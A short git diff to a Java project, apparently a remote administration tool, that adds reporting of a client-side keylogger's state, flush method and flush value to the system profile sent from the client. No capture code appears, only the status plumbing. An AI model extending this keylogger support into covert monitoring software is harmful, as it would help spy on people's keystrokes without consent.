@@ -45,8 +45,10 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.Client;
+import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
+import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Misc.GraphicsDisplay;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -438,6 +440,12 @@ public enum Platform {
 			info.setExtIp(getExtIp());
 			for (GraphicsDisplay gd : getDisplays()) {
 				info.addDisplays(gd);
+			}
+
+			if (Common.instance == Instance.CLIENT) {
+				info.setKeyloggerState(Keylogger.isLogging() ? State.ONLINE : State.OFFLINE);
+				info.setFlushMethod(Client.ic.getKeyloggerFlushMethod());
+				info.setFlushValue(Client.ic.getKeyloggerFlushValue());
 			}
 
 			return info.build();
